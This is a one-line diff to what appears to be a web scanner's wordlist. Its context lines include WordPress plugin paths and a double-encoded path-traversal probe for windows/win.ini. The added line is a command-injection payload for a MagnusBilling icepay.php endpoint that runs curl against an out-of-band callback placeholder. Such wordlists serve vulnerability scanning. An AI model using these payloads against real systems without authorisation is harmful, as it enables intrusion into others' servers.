@@ -277,3 +277,4 @@
 /wp-content/plugins/fastdup/logs/
 /wp-content/plugins/wp-file-manager/readme.txt
 /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini
+/mbilling/lib/icepay/icepay.php?democ={{randstr}};curl%20{{interactsh-url}};%23
